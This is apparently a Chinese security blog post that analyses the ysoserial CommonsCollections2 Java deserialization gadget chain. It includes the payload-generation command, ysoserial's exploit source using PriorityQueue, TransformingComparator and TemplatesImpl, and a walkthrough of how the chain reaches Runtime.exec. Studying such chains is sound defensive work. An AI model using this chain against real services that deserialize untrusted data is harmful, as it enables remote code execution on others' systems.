---
title: "Ysoserial Commonscollections 2"
date: 2020-04-17T10:48:27+08:00
draft: false
tags:
- java
- ysoserial
series:
-
categories:
- 代码审计
---

拖延症严重😂
<!--more-->
## 复现
JDK8u221，生成反序列化文件

```java
java -jar ysoserial-master-30099844c6-1.jar CommonsCollections2 calc > test.ser
```

构造反序列化点

```java
package com.xxe.run;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class CommonsCollections2 {
    public static void main(String[] args) {
        readObject();
    }

    public static void readObject() {
        FileInputStream fis = null;
        try {
            fis = new FileInputStream("web/test.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![image.png](https://y4er.com/img/uploads/20200419221002.png)

## 分析
gadget chain

```
/*
    Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
 */
```

ysoserial的exp

```java
public Queue<Object> getObject(final String command) throws Exception {
    final Object templates = Gadgets.createTemplatesImpl(command);
    // mock method name until armed
    final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

    // create queue with numbers and basic comparator
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
    // stub data for replacement later
    queue.add(1);
    queue.add(1);

    // switch method called by comparator
    Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

    // switch contents of queue
    final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
    queueArray[0] = templates;
    queueArray[1] = 1;

    return queue;
}
```

反序列化从PriorityQueue开始，进入PriorityQueue的readObject()

> PriorityQueue 一个基于优先级的无界优先级队列。**优先级队列的元素按照其自然顺序进行排序**，或者根据构造队列时提供的 Comparator 进行排序，具体取决于所使用的构造方法。该队列不允许使用 null 元素也不允许插入不可比较的对象(没有实现Comparable接口的对象)。PriorityQueue 队列的头指排序规则最小的元素。如果多个元素都是最小值则随机选一个。PriorityQueue 是一个无界队列，但是初始的容量(实际是一个Object[])，随着不断向优先级队列添加元素，其容量会自动扩容，无需指定容量增加策略的细节。

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

既然是一个优先级队列，那么必然存在排序，在heapify()中

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]); // 进行排序
}
private void siftDown(int k, E x) {
    if (comparator != null) 
        siftDownUsingComparator(k, x); // 如果指定比较器就使用
    else
        siftDownComparable(k, x);  // 没指定就使用默认的自然比较器
}
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
private void siftDownComparable(int k, E x) {
    Comparable<? super E> key = (Comparable<? super E>)x;
    int half = size >>> 1;        // loop while a non-leaf
    while (k < half) {
        int child = (k << 1) + 1; // assume left child is least
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            ((Comparable<? super E>) c).compareTo((E) queue[right]) > 0)
            c = queue[child = right];
        if (key.compareTo((E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = key;
}
```

两个排序使用选择排序法将入列的元素放到队列左边或右边。那么comparator从哪来？

![image.png](https://y4er.com/img/uploads/20200419229613.png)

在PriorityQueue中定义了comparator字段

```java
private final Comparator<? super E> comparator;
```

在PriorityQueue中有这样一个其构造方法
![image.png](https://y4er.com/img/uploads/20200419224465.png)

所以可以通过实例化赋值。

为什么要用到PriorityQueue？在之前的cc链分析文章中我们讲过cc链的核心问题是出在`org.apache.commons.collections4.functors.InvokerTransformer#transform`的反射任意方法调用。我们反序列化时必须自动触发transform()函数，而在`org.apache.commons.collections4.comparators.TransformingComparator#compare`中调用了这个函数

![image.png](https://y4er.com/img/uploads/20200419222196.png)

this.transformer是Transformer类，在exp中承载的就是InvokerTransformer，而TransformingComparator也是比较器，我们可以通过PriorityQueue队列自动排序的特性触发compare()，进一步触发transform()。

小结一下：
1. PriorityQueue队列会自动排序触发比较器的compare()
2. TransformingComparator是比较器并且在其compare()中调用了transform()
3. transform()可以反射任意方法

到目前为止我们可以通过反序列化调用任意方法，但是不能像cc5构造的ChainedTransformer那样链式调用，继续看exp怎么构造的。

![image.png](https://y4er.com/img/uploads/20200419226310.png)

向队列中加入两个"1"占位然后将第一个元素修改为templates，追溯templates到createTemplatesImpl

```java
public static Object createTemplatesImpl ( final String command ) throws Exception {
    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        return createTemplatesImpl(
            command,
            Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
            Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
            Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
    }

    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}

public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String template)
    throws Exception {
    final T templates = tplClass.newInstance();

    // use template gadget class
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    // run command in static initializer
    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections

    clazz.makeClassInitializer().insertAfter(template);
    // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);

    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    return templates;
}
```

上面这段代码做了以下几件事：
1. 实例化了一个`org.apache.xalan.xsltc.trax.TemplatesImpl`对象templates，该对象`_bytecodes`可以存放字节码
2. 自己写了一个`StubTransletPayload`类 继承`AbstractTranslet`并实现`Serializable`接口
3. 获取`StubTransletPayload`字节码并使用javassist插入`templates`字节码(Runtime.exec命令执行)
4. 反射设置`templates`的`_bytecodes`为包含命令执行的字节码

> javassist是Java的一个库，可以修改字节码。参考 [javassist使用全解析](https://www.cnblogs.com/rickiyang/p/11336268.html)

现在准备好了反序列化的类，上个小结中我们实现了任意方法调用。在看exp中把`iMethodName`设置为`newTransformer`
![image.png](https://y4er.com/img/uploads/20200419221618.png)

然后到了`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer`
![image.png](https://y4er.com/img/uploads/20200419228249.png)

跟进getTransletInstance()
![image.png](https://y4er.com/img/uploads/20200419227297.png)

根据方法名就能猜出来defineTransletClasses()是通过字节码定义类，然后通过newInstance()实例化，跟进defineTransletClasses()看下

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

通过字节码加载`StubTransletPayload`类，然后实例化`StubTransletPayload`类对象，在实例化时触发Runtime.exec造成RCE。

## 参考
1. https://xz.aliyun.com/t/1756
2. https://www.cnblogs.com/rickiyang/p/11336268.html


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**